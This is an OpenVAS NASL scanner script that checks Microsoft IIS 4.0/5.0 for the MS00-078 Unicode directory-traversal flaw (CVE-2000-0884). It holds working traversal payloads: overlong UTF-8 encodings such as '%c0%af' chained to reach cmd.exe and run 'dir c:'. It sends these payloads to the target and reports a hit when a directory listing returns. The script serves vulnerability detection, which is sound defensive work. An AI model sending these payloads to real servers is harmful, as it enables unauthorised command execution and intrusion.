###############################################################################
# OpenVAS Vulnerability Test
# $Id: remote-MS00-078.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# Microsoft Security Bulletin (MS00-078)
# 'Web Server Folder Traversal' Vulnerability
# Microsoft IIS Executable File Parsing Vulnerability (MS00-086)
#
# Affected Software:
# Microsoft Internet Information Server 4.0
# Microsoft Internet Information Server 5.0
#
# remote-MS00-078.nasl
#
# Author:
# Christian Eric Edjenguele <christian.edjenguele@owasp.org>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 or later,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.101014");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0884");
  script_bugtraq_id(1806);
  script_name("Microsoft MS00-078 security check");
  script_category(ACT_ATTACK);
  script_copyright("Christian Eric Edjenguele <christian.edjenguele@owasp.org>");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://support.microsoft.com/kb/269862/en-us");
  script_xref(name:"URL", value:"http://technet.microsoft.com/windowsserver/2000/default.aspx");

  script_tag(name:"solution", value:"There is not a new patch for this vulnerability. Instead, it is eliminated
  by the patch that accompanied Microsoft Security Bulletin MS00-057. Please see the references for more information.");

  script_tag(name:"summary", value:"Microsoft IIS 4.0 and 5.0 are affected by a web server trasversal vulnerability.");

  script_tag(name:"impact", value:"This vulnerability could potentially allow a visitor to a web site to take a wide
  range of destructive actions against it, including running programs on it.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

# remote command to run
r_cmd = '/winnt/system32/cmd.exe?/c+dir+c:';

d = make_list('/scripts/',
              '/msadc/',
              '/iisadmpwd/',
              '/_vti_bin/',
              '/_mem_bin/',
              '/exchange/',
              '/pbserver/',
              '/rpc/',
              '/cgi-bin/',
              '/');

uc = make_list('%c0%af',
               '%c0%9v',
               '%c1%c1',
               '%c0%qf',
               '%c1%8s',
               '%c1%9c',
               '%c1%pc',
               '%c1%1c',
               '%c0%2f',
               '%e0%80%af');

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port ) ) # To have a reference to the detection NVT
  exit( 0 );

foreach webdir( d )  {

  foreach uni_code( uc ) {

    url = strcat( webdir , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , r_cmd );

    qry = string( '/' + url );

    req = http_get( item:qry, port:port );
    reply = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( reply ) {

      header_server = egrep( pattern:"Server", string:reply, icase:TRUE );
      if( ( "Microsoft-IIS" >< header_server ) && ( egrep( pattern:"HTTP/1.[01] 200", string:reply ) ) &&
          ( ( "<dir>" >< reply ) || 'directory of' >< reply ) ) {
        report = string( "Exploit String", url ," for vulnerability:\n", reply , "\n" );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );